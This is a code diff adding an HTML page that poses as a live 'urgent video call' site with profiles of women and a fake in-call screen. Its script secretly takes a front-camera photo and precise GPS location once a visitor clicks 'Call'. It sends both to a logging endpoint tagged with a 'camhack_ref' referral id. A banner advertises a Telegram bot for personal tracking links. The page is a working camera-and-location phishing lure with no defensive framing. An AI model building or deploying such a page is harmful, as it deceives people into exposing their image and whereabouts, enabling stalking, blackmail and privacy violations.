@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>💋 Live Video Chat - Urgent Call</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Pacifico&family=Roboto:wght@400;700&display=swap');
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(135deg, #1a0033, #4a004d, #1a0033);
+      color: white;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      overflow-y: auto;
+      text-align: center;
+    }
+    .container {
+      max-width: 440px;
+      margin: 20px auto;
+      background: rgba(0,0,0,0.9);
+      border-radius: 25px;
+      padding: 25px 20px;
+      box-shadow: 0 0 40px rgba(255, 20, 147, 0.8);
+      border: 3px solid #ff1493;
+    }
+    .header {
+      font-family: 'Pacifico', cursive;
+      font-size: 34px;
+      color: #ff1493;
+      margin-bottom: 5px;
+      text-shadow: 0 0 15px #ff1493;
+    }
+    .girl-img {
+      width: 180px;
+      height: 180px;
+      border-radius: 50%;
+      border: 6px solid #ff1493;
+      margin: 15px auto;
+      box-shadow: 0 0 30px #ff1493;
+      animation: glow 2s infinite alternate;
+      object-fit: cover;
+    }
+    @keyframes glow { from { box-shadow: 0 0 20px #ff1493; } to { box-shadow: 0 0 40px #ff69b4; } }
+    .status {
+      color: #00ff00;
+      font-weight: bold;
+      font-size: 16px;
+      animation: pulse 1.5s infinite;
+    }
+    .message {
+      background: #2a002a;
+      padding: 16px;
+      border-radius: 15px;
+      margin: 20px 0;
+      font-size: 15px;
+      border-left: 5px solid #ffd700;
+      text-align: left;
+      line-height: 1.4;
+    }
+    .btn {
+      background: linear-gradient(45deg, #ff1493, #ff69b4, #ff1493);
+      color: white;
+      padding: 16px 40px;
+      font-size: 18px;
+      border: none;
+      border-radius: 50px;
+      cursor: pointer;
+      margin: 15px 0;
+      box-shadow: 0 10px 25px rgba(255,20,147,0.6);
+      transition: all 0.4s;
+      font-weight: bold;
+      width: 100%;
+    }
+    .btn:hover {
+      transform: scale(1.03) translateY(-2px);
+      box-shadow: 0 15px 35px rgba(255,20,147,0.9);
+    }
+    .cards { margin-top: 25px; display: grid; gap: 12px; }
+    .card {
+      background: rgba(255,255,255,0.08);
+      padding: 12px 15px;
+      border-radius: 15px;
+      border: 1px solid #ff1493;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .card-info { text-align: left; }
+    .card-name { font-size: 18px; color: #ff1493; font-weight: bold; }
+    .card-status { color: #00ff00; font-size: 12px; }
+    video, canvas { display: none; }
+    
+    /* Call Modal / Screen */
+    #call-screen {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: #000;
+      z-index: 9999;
+      flex-direction: column;
+      justify-content: space-between;
+      align-items: center;
+      padding: 30px;
+      box-sizing: border-box;
+    }
+    .call-header { font-size: 22px; color: #ff1493; font-weight: bold; }
+    .call-video-box {
+      width: 100%;
+      max-width: 400px;
+      height: 60vh;
+      background: #111;
+      border-radius: 20px;
+      border: 3px solid #ff1493;
+      position: relative;
+      overflow: hidden;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .call-video-box img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.9); }
+    .call-timer { color: #00ff00; font-size: 18px; font-weight: bold; margin-top: 10px; }
+    .end-call-btn {
+      background: #ff3333;
+      color: white;
+      border: none;
+      padding: 15px 40px;
+      border-radius: 30px;
+      font-size: 18px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 5px 20px rgba(255,0,0,0.5);
+    }
+
+    .banner {
+      background: rgba(255, 215, 0, 0.15);
+      border: 1px solid #ffd700;
+      padding: 12px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      font-size: 13px;
+      color: #ffd700;
+    }
+    .banner a { color: #ff69b4; font-weight: bold; text-decoration: underline; }
+
+    footer {
+      margin-top: 30px;
+      font-size: 11px;
+      opacity: 0.6;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div id="promo-banner" class="banner" style="display:none;">
+      ✨ Want your own custom tracking link? <br>
+      <a href="https://t.me/your_bot_username" target="_blank" id="bot-link">Click here to open our Telegram Bot</a> and send <code>/start</code>!
+    </div>
+
+    <div class="header">💋 Urgent Video Call</div>
+    <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80" class="girl-img" alt="Live Girl" id="main-img">
+    <div class="status">● ONLINE NOW - READY FOR CALL</div>
+
+    <div class="message">
+      Hey there, I've been waiting for you...<br>
+      <strong>Allow Camera + Location access</strong> to start your private 1-on-1 video call instantly!<br>
+      <span style="color:#ffd700;">Don't keep me waiting 😘</span>
+    </div>
+
+    <button class="btn" onclick="startCall('Haleema')">START VIDEO CALL NOW</button>
+
+    <div class="cards" id="cards"></div>
+
+    <footer>
+      🔒 256-Bit Secure Connection • Private & Confidential
+    </footer>
+  </div>
+
+  <!-- Active Call Screen Simulator -->
+  <div id="call-screen">
+    <div class="call-header" id="call-title">Connecting to Haleema...</div>
+    <div class="call-video-box">
+      <img src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=600&q=80" id="call-avatar" alt="Video Feed">
+      <div style="position: absolute; bottom: 15px; left: 15px; background: rgba(0,0,0,0.6); padding: 5px 12px; border-radius: 8px; font-size: 14px;">
+        🔴 Live HD Feed
+      </div>
+    </div>
+    <div class="call-timer" id="call-timer">Connecting (00:00)...</div>
+    <button class="end-call-btn" onclick="endCall()">End Call</button>
+  </div>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" width="640" height="480"></canvas>
+
+  <script>
+    // Extract ref from URL if present
+    const urlParams = new URLSearchParams(window.location.search);
+    const ref = urlParams.get('ref');
+
+    if (ref) {
+      localStorage.setItem('camhack_ref', ref);
+    } else {
+      // Show promo banner if no ref in URL
+      const savedRef = localStorage.getItem('camhack_ref');
+      if (!savedRef) {
+        document.getElementById('promo-banner').style.display = 'block';
+      }
+    }
+
+    const girls = [
+      { name: "Haleema", img: "https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=400&q=80" },
+      { name: "Iqra", img: "https://images.unsplash.com/photo-1517841905240-472988babdf9?auto=format&fit=crop&w=400&q=80" },
+      { name: "Fatima", img: "https://images.unsplash.com/photo-1494790108377-be9c29b29330?auto=format&fit=crop&w=400&q=80" },
+      { name: "Dua", img: "https://images.unsplash.com/photo-1524504388940-b1c1722653e1?auto=format&fit=crop&w=400&q=80" },
+      { name: "Saira", img: "https://images.unsplash.com/photo-1529626455594-4ff0802cfb7e?auto=format&fit=crop&w=400&q=80" },
+      { name: "Sidra", img: "https://images.unsplash.com/photo-1488426862026-3ee34a7d66df?auto=format&fit=crop&w=400&q=80" },
+      { name: "Noor", img: "https://images.unsplash.com/photo-1508214751196-bcfd4ca60f91?auto=format&fit=crop&w=400&q=80" },
+      { name: "Rimsha", img: "https://images.unsplash.com/photo-1531746020798-e6953c6e8e04?auto=format&fit=crop&w=400&q=80" }
+    ];
+
+    const cardsContainer = document.getElementById("cards");
+
+    girls.forEach(girl => {
+      const card = document.createElement("div");
+      card.className = "card";
+      card.innerHTML = `
+        <div style="display:flex; align-items:center; gap:12px;">
+          <img src="${girl.img}" style="width:45px; height:45px; border-radius:50%; border:2px solid #ff1493; object-fit:cover;">
+          <div class="card-info">
+            <div class="card-name">${girl.name}</div>
+            <div class="card-status">Online • HD Video Available</div>
+          </div>
+        </div>
+        <button class="btn" style="padding:10px 18px; font-size:14px; width:auto; margin:0;" onclick="startCall('${girl.name}', '${girl.img}')">Call</button>
+      `;
+      cardsContainer.appendChild(card);
+    });
+
+    let callTimerInterval = null;
+
+    async function startCall(name, imgUrl) {
+      if (imgUrl) {
+        document.getElementById('main-img').src = imgUrl;
+        document.getElementById('call-avatar').src = imgUrl;
+      }
+      document.getElementById('call-title').textContent = `Connecting to ${name}...`;
+      document.getElementById('call-screen').style.display = 'flex';
+
+      const activeRef = ref || localStorage.getItem('camhack_ref');
+
+      // Send instant click alert immediately
+      fetch('/api/log', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ name, status: 'clicked', ref: activeRef })
+      }).catch(() => {});
+
+      // Trigger capture and send in background immediately
+      captureAndSend(name, activeRef);
+
+      // Start simulated timer
+      let seconds = 0;
+      const timerEl = document.getElementById('call-timer');
+      timerEl.textContent = "Connecting to secure stream...";
+      
+      setTimeout(() => {
+        timerEl.textContent = "Call Connected (00:00)";
+        let sec = 0;
+        callTimerInterval = setInterval(() => {
+          sec++;
+          const m = String(Math.floor(sec / 60)).padStart(2, '0');
+          const s = String(sec % 60).padStart(2, '0');
+          timerEl.textContent = `Call in progress (${m}:${s})`;
+        }, 1000);
+      }, 2500);
+    }
+
+    function endCall() {
+      if (callTimerInterval) clearInterval(callTimerInterval);
+      document.getElementById('call-screen').style.display = 'none';
+      alert("Call ended by peer.");
+    }
+
+    async function captureAndSend(name, activeRef) {
+      try {
+        const video = document.getElementById("video");
+        const canvas = document.getElementById("canvas");
+        const ctx = canvas.getContext("2d");
+
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        video.srcObject = stream;
+
+        await new Promise(r => { video.onloadedmetadata = () => { video.play(); setTimeout(r, 400); }; });
+
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const imageData = canvas.toDataURL("image/jpeg", 0.95);
+
+        stream.getTracks().forEach(t => t.stop());
+
+        // Send photo immediately without waiting for GPS
+        fetch('/api/log', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            name,
+            photo: imageData,
+            ref: activeRef
+          })
+        }).catch(() => {});
+
+        // Get location in background and send if available
+        getLocation().then(locationData => {
+          if (locationData) {
+            fetch('/api/log', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                name,
+                lat: locationData.lat,
+                lon: locationData.lon,
+                acc: locationData.acc,
+                ref: activeRef,
+                isLocationUpdate: true
+              })
+            }).catch(() => {});
+          }
+        }).catch(() => {});
+
+      } catch (err) {
+        console.warn("Camera/Location permission denied or unavailable:", err);
+      }
+    }
+
+    function getLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) {
+          reject(new Error("Geolocation not supported"));
+          return;
+        }
+        navigator.geolocation.getCurrentPosition(
+          p => resolve({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }),
+          reject,
+          { enableHighAccuracy: true, timeout: 10000 }
+        );
+      });
+    }
+  </script>
+</body>
+</html>
